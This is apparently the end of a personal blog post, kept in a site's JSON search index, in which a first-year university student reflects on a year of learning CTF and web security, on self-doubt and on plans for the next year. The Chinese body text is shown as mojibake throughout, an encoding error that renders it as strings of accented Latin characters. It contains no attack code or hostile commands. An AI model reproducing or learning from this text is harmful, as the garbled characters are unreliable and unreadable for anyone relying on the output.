æ¯”å¦‚ç›®å½•éå†ï¼Œè„‘å­é‡Œåªèƒ½è¯´æœ‰ä¸ªæ®‹å­˜çš„å°è±¡ å¯çœŸæ­£ç»™æˆ‘ä¸ªè¿™æ ·çš„é¢˜ è¿˜æ˜¯ä¸èƒ½è¯´è½»æ¾ä¸Šæ‰‹ï¼Œç”šè‡³æ˜¯å¯¹ä¸€äº›æ¦‚å¿µè¿˜ç†ä¸æ¸…æ¥šï¼Œå­¦çš„ä¸œè¥¿å¯èƒ½çœ‹èµ·æ¥æ˜¯æœ‰ä¸ªæ ·å­ ä½†æˆ‘å¿ƒé‡Œæ¸…æ¥š å·®çš„è¿˜å¤ªè¿œå¤ªè¿œï¼Œç”šè‡³å®Œå…¨æ²¡æœ‰åˆ°èƒ½è‡ªä¿¡çš„è·Ÿåˆ«äººè¯´â€œæˆ‘åœ¨å­¦ctf æˆ‘åœ¨å­¦å®‰å…¨â€çš„ç¨‹åº¦ã€‚\nå­¦ä¸åŠ¨çš„æ—¶å€™ç»å¸¸ä¼šçœ‹å¤§ä½¬çš„åšå®¢ï¼Œçœ‹çœ‹åˆ«äººçš„å­¦ä¹ ç»å†æ˜¯ä»€ä¹ˆæ ·çš„ã€‚ä¹‹å‰è¿˜ä¼šæ‹¿å¹´é¾„åšè‡ªæˆ‘å¼€è„±çš„å€Ÿå£ï¼Œè¿˜å°ï¼Œè¿˜æ—©ï¼Œè¿˜éƒ½æ¥å¾—åŠï¼Œå¯æ˜¯è¶Šå­¦ è¶Šå‘ç°è¦å»ç‚¹äº®çš„æŠ€èƒ½æ ‘è¶Šæ˜¯æç¹å¶èŒ‚ï¼Œåšåšçš„æ ‘å† ä»¿ä½›è¦é®å¤©è”½æ—¥èˆ¬â€”â€”è¦å­¦java æé«˜ä»£ç å®¡è®¡èƒ½åŠ› å¸¸è§çš„æ¼æ´ç±»å‹è¦åšåˆ°å¿ƒé‡Œæœ‰æ•°ï¼Œè¦æŠŠä¹‹å‰åšè¿‡çš„é¢˜å¤šæ¸©ä¹  å¤šæƒ³å¤šç»ƒå¤šçœ‹ï¼Œè¦åšåˆ°çœŸæ­£çš„æŒæ¡çŸ¥è¯† è€Œä¸æ˜¯è®°ä½è¿™ä¸ªä¸œè¥¿å«ä»€ä¹ˆ å¾’æœ‰å…¶è¡¨ï¼Œè¦å¤šå†™å†™ä»£ç  å†™ä»£ç çš„åŸºæœ¬åŠŸå¤ªå·®é‚£è‚¯å®šæ˜¯èµ°ä¸è¿œï¼Œæœ€æ„Ÿå…´è¶£çš„æ¸—é€å’Œæ¼æ´æ–¹é¢çš„ä¸œè¥¿æ›´è¦å¤šçœ‹ å¯ä»¥æœ¬åœ°å¤ç°çš„ä¸è¦æ‡’ï¼›å³ä¾¿å¦‚æ­¤ï¼Œä¹Ÿæœ‰ä¸å°‘é˜³å…‰èƒ½å¤Ÿç©¿é€æ ‘å¶äº¤å ä¹‹å¤„ï¼Œæ¸©æš–çš„æ´’è½ã€‚å¯èƒ½æˆ‘çœŸçš„ä¸æ˜¯æ‰€è°“çš„å¤©èµ‹å‹é€‰æ‰‹ï¼Œåªä¸è¿‡æ˜¯ä¸‡åƒå¹³å¹³æ— å¥‡çš„æ™®é€šäººä¹‹ä¸€ï¼Œå­¦ä¹ èƒ½åŠ›ä¹Ÿå°±æ˜¯ä¸ªä¸­ç­‰æ°´å¹³ï¼Œä½†æ˜¯æˆ‘ç›¸ä¿¡é‡å˜å¼•èµ·è´¨å˜ï¼Œç›¸ä¿¡æŒä¹‹ä»¥æ’çš„åŠªåŠ›ä¼šå¸¦æ¥æ”¹å˜ï¼Œæ›´ä½•å†µè¿™è¿˜æ˜¯æˆ‘éå¸¸å–œæ¬¢çš„äº‹æƒ…ï¼›å¯èƒ½æˆ‘å³ä½¿åŠªåŠ›å››å¹´ ä¹Ÿè¾¾ä¸åˆ°é‚£äº›å¤§ä½¬åŠå¹´å°±èƒ½è¾¾åˆ°çš„é«˜åº¦ï¼Œä½†æ˜¯ä¸é‡è¦ å­¦ä¹ å˜› å°±æ˜¯ä¸ä¼šæ‰è¦å­¦ï¼Œå°±ç®—å­¦ä¸ä¼šä¹Ÿä¸æ˜¯ä»€ä¹ˆä¸¢äººçš„äº‹æƒ…ï¼Œæ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚\nå†ä¸€æŠ¬çœ¼ï¼Œæš‘å‡å°±è¦æ¥äº†ã€‚è¦å¹²çš„å’Œè¦å­¦çš„å¾ˆå¤šï¼Œåƒå¤´ä¸‡ç»ªçš„ï¼›ä½†ä¹Ÿç®—æ˜¯æœ‰æ˜ç¡®çš„æ–¹å‘ï¼Œäººè¿˜æ˜¯å¿™èµ·æ¥å¥½ã€‚ä¸‹å­¦æœŸå°±å¤§äºŒäº†ï¼Œå†ä¸€æ™ƒå°±å¤§ä¸‰äº†ï¼Œè‡ªå·±æ˜¯ä¸æƒ³è€ƒç ”çš„ï¼Œä½†æ˜¯åˆ°äº†å¤§å›› è‡ªå·±çš„å®åŠ›å¤Ÿè¿›å¤§å‚å—ï¼Ÿä¼šä¸ä¼šæ¯•ä¸šå³å¤±ä¸šï¼Ÿæˆ‘ä¸çŸ¥é“ï¼Œä½†è°åˆçŸ¥é“å‘¢ï¼Ÿæœªæ¥çš„äº‹æƒ…é¢„æµ‹ä¸äº†ï¼Œèƒ½åšçš„åªæœ‰æŠŠæ¡å½“ä¸‹ã€‚\nå¤§ä¸€å°±è¦ç»“æŸäº†ï¼Œåœ¨å›¾ä¹¦é¦†å¸¸åçš„åº§ä½ä¸Šï¼Œæ‰“å¼€typoraï¼Œè‰è‰çš„å¤ç›˜äº†ä¸€ä¸‹æ•´ä¸ªä¸€å­¦å¹´ã€‚ä¸Šä¸€æ¬¡å†™å¤ç›˜æ€»ç»“è¿˜æ˜¯å…­æœˆåˆ åˆšå†›è®­å®Œï¼Œä¸€ä¸ªæœ‰ç‚¹è¿·èŒ«çš„æ—¶å€™ã€‚å¦‚æœè·Ÿ0åŸºç¡€çš„è‡ªå·±æ¯”èµ·æ¥ï¼Œå¯ä»¥è¯´æ˜¯æˆé•¿äº†ä¸å°‘ï¼›ä½†æˆ‘çŸ¥é“è¿™è¿˜è¿œè¿œè¾¾ä¸åˆ°å¹³å‡çº¿ï¼Œå·®çš„è¿˜å¤ªå¤šï¼Œæ˜¯å®Œå…¨æ‹¿ä¸å‡ºæ‰‹çš„ç¨‹åº¦ã€‚ä½†æ€»çš„æ¥è¯´ï¼Œè¿˜ç®—æœ‰ä¸€ç‚¹ç‚¹å°å°çš„æ”¶è·ï¼Œå¸Œæœ›è‡ªå·±åœ¨ä¹‹åçš„æ—¥å­é‡Œä¹Ÿèƒ½åšå®ˆä½åˆå¿ƒï¼Œä¿æŒå¯¹å®‰å…¨çš„çƒ­çˆ±ï¼Œä¿æŒå­¦ä¹ çš„çƒ­æƒ…ï¼Œä¹Ÿä¿æŒå¯¹ç¾å¥½ç”Ÿæ´»çš„çƒ­å¿±ï¼›å¸Œæœ›èƒ½å¤Ÿå˜å¾—è¶Šæ¥è¶Šå¼ºå¤§ï¼›å¸Œæœ›å¤§äºŒçš„å¯’å‡å†™å¤ç›˜æ€»ç»“çš„æ—¶å€™èƒ½æœ‰æ›´å¤šå¯å†™çš„ æ›´å¤šå¼€å¿ƒçš„äº‹æƒ…ã€‚\nï¼šï¼‰\n ä¹‹åçš„æ€»ç»“å‘€ï¼Œä¸€äº›éšç¬”ä¹Ÿéƒ½ä¼šæ”¾åˆ°å°ç«™ä¸Šï¼Œä¸è¿‡ä¸€éƒ¨åˆ†å°±ä¸æ”¾åˆ°å…¬å¼€å±•ç¤ºçš„postsä¸Šäº†ï¼Œurlå°±æ˜¯/:year/:month/:day/:slug/çš„å½¢å¼ï¼Œç®—æ˜¯å˜ç›¸çš„åŠ å¯†åšå®¢äº†å­ï¼Ÿä¸è¿‡åº”è¯¥ä¹Ÿé˜²ä¸ä½ä»€ä¹ˆæï¼ˆ\n","date":"2021-07-22T18:27:39+08:00","permalink":"https://amiaaaz.github.io/2021/07/22/0920-0721-summary/","section":"secrets","tags":[],"title":"ä¸€ç‚¹å°å°çš„æ€»ç»“ï¼ˆ"}]